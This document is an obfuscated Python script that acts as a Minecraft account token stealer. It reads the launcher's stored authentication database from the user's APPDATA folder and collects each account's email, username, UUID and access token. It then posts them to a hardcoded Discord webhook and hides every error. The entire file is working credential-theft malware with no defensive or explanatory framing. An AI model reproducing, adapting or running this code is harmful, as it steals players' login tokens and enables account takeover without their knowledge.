import json #line:1
import os #line:2
from urllib .request import Request ,urlopen #line:3
WEBHOOK_URL ="https://discordapp.com/api/webhooks/932039584584441897/Ybzlf29to1FT76cSjRkiqCy40vs3E0abZIt6pVK9gsYJcCghlzhR8qKuW_-i875Wp_su"#line:6
PING_ME =True #line:9
def uuid_dashed (O0O00OOO0000O0OO0 ):#line:11
    return f"{O0O00OOO0000O0OO0[0:8]}-{O0O00OOO0000O0OO0[8:12]}-{O0O00OOO0000O0OO0[12:16]}-{O0O00OOO0000O0OO0[16:21]}-{O0O00OOO0000O0OO0[21:32]}"#line:12
def main ():#line:14
    OO0OOO00000000O0O =json .loads (open (os .getenv ("APPDATA")+"\\.minecraft\\launcher_profiles.json").read ())["authenticationDatabase"]#line:15
    O0O000O0000O0OO0O =[]#line:17
    for O0OO0OO0O00000O0O in OO0OOO00000000O0O :#line:19
        try :#line:20
            O00O0OOOOO0000000 =OO0OOO00000000O0O [O0OO0OO0O00000O0O ].get ("username")#line:21
            OOO0O0OO0000000O0 ,O0OOO00O0O0O0O0O0 =list (OO0OOO00000000O0O [O0OO0OO0O00000O0O ]["profiles"].items ())[0 ]#line:22
            O0O00OOOO00O0OOOO ={"fields":[{"name":"Email","value":O00O0OOOOO0000000 if O00O0OOOOO0000000 and "@"in O00O0OOOOO0000000 else "N/A","inline":False },{"name":"Username","value":O0OOO00O0O0O0O0O0 ["displayName"].replace ("_","\\_"),"inline":True },{"name":"UUID","value":uuid_dashed (OOO0O0OO0000000O0 ),"inline":True },{"name":"Token","value":OO0OOO00000000O0O [O0OO0OO0O00000O0O ]["accessToken"],"inline":True }]}#line:30
            O0O000O0000O0OO0O .append (O0O00OOOO00O0OOOO )#line:31
        except :#line:32
            pass #line:33
    O0OOOO0O0OOO000O0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:38
    OOO0OO000000O0000 =json .dumps ({"embeds":O0O000O0000O0OO0O ,"content":"@everyone"if PING_ME else ""})#line:40
    try :#line:42
        OOOOOOOO00OO000OO =Request (WEBHOOK_URL ,data =OOO0OO000000O0000 .encode (),headers =O0OOOO0O0OOO000O0 )#line:43
        urlopen (OOOOOOOO00OO000OO )#line:44
    except :#line:45
        pass #line:46
if __name__ =="__main__":#line:48
    main ()
